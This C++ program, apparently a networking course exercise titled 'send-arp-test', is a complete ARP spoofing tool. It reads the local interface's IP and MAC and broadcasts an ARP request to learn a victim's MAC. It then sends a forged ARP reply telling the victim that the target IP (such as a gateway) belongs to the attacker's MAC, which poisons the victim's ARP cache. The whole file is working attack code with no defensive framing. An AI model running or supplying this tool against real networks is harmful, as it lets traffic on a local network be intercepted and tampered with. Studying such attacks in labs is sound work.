#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include <libnet.h>
#include <unistd.h>
#include <linux/if_packet.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

int get_self_ip_address(const char* interface, char* atk_ip)
{
    struct ifreq ifr;
    int sock;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock < 0)
    {
        perror("socket");
        return -1;
    }

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl (IP)");
        close(sock);
        return -1;
    }

    struct sockaddr_in* addr = (struct sockaddr_in*)&ifr.ifr_addr;

    if(inet_ntop(AF_INET, &(addr->sin_addr), atk_ip, INET_ADDRSTRLEN) == NULL)
    {
        perror("inet error");
        close(sock);
        return -1;
    }

    close(sock);
    return 0;
}

int get_mac_address(const char* interface, uint8_t* mac)
{
    struct ifreq ifr;
    int sock;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock < 0) {
        perror("socket");
        return -1;
    }

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

    if(ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return -1;
    }

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
		usage();
		return EXIT_FAILURE;
	}

    int cnt = (argc - 2) / 2;

    for(int i = 0; i < cnt; i++)
    {
        char* dev = argv[1];
        char* sender_ip = argv[2 + (2 * i)];
        char* target_ip = argv[2 + (2 * i) + 1];
        char atk_ip[INET_ADDRSTRLEN] = {0, };
        uint8_t atk_mac[Mac::SIZE];
        uint8_t sender_mac[Mac::SIZE];

        memset(atk_mac, 0, Mac::SIZE);
        memset(sender_mac, 0, Mac::SIZE);

        if(!inet_aton(sender_ip, NULL) || !inet_aton(target_ip, NULL)) {
            printf("Invalid IP address format\n");
            return EXIT_FAILURE;
        }

        if(get_self_ip_address(dev, atk_ip) != 0)
        {
            printf("Error of getting IP\n");
            return EXIT_FAILURE;
        }

        if(get_mac_address(dev, atk_mac) != 0)
        {
            printf("Can`t find mac\n");
            return EXIT_FAILURE;
        }

        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
        if (pcap == nullptr) {
            fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
            return EXIT_FAILURE;
        }

        EthArpPacket packet;

        packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
        packet.eth_.smac_ = Mac(atk_mac);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;

        packet.arp_.op_ = htons(ArpHdr::Request);

        packet.arp_.smac_ = Mac(atk_mac);
        packet.arp_.sip_ = htonl(Ip(atk_ip));
        packet.arp_.tmac_ = Mac("FF:FF:FF:FF:FF:FF");
        packet.arp_.tip_ = htonl(Ip(sender_ip));

        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        }

        while (true)
        {
            struct pcap_pkthdr* header;
            const u_char* packet;
            struct libnet_ethernet_hdr* ethheader;
            struct libnet_arp_hdr* arpheader;

            int res = pcap_next_ex(pcap, &header, &packet);
            if(res == 0)
            {
                printf("time out, continuing...\n");
                continue;
            }
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
                break;
            }
            ethheader = (struct libnet_ethernet_hdr *)packet;
            if(ntohs(ethheader->ether_type) != ETHERTYPE_ARP)
            {
                printf("Not ARP...\n");
                continue;
            }
            arpheader = (struct libnet_arp_hdr *)(packet + LIBNET_ETH_H);
            if(ntohs(arpheader->ar_op) != ARPOP_REPLY)
            {
                printf("Not Reply...\n");
                continue;
            }
            for(int i = 0; i < 6; i++)
            {
                sender_mac[i] = ethheader->ether_shost[i];
            }
            break;
        }

        EthArpPacket pack;

        pack.eth_.dmac_ = Mac(sender_mac);
        pack.eth_.smac_ = Mac(atk_mac);
        pack.eth_.type_ = htons(EthHdr::Arp);

        pack.arp_.hrd_ = htons(ArpHdr::ETHER);
        pack.arp_.pro_ = htons(EthHdr::Ip4);
        pack.arp_.hln_ = Mac::SIZE;
        pack.arp_.pln_ = Ip::SIZE;

        pack.arp_.op_ = htons(ArpHdr::Reply);

        pack.arp_.smac_ = Mac(atk_mac);
        pack.arp_.sip_ = htonl(Ip(target_ip));
        pack.arp_.tmac_ = Mac(sender_mac);
        pack.arp_.tip_ = htonl(Ip(sender_ip));

        int res2 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&pack), sizeof(EthArpPacket));
        if (res2 != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(pcap));
        }

        pcap_close(pcap);
    }
}
